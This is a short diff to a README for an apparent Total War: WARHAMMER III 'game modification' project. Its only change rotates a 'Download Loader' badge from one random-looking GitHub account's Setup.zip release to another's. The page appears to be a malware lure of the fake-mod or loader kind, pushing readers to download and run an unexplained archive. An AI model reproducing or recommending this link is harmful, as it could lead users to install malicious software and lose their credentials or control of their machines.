@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Total War: WARHAMMER III Companion
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Total-War-WARHAMMER-III-Companion` · Updated: 2026-11-04
 
 **Tags:** `total-war-warhammer-iii` `companion` `strategy` `campaign` `tactics` `windows` `steam`
+
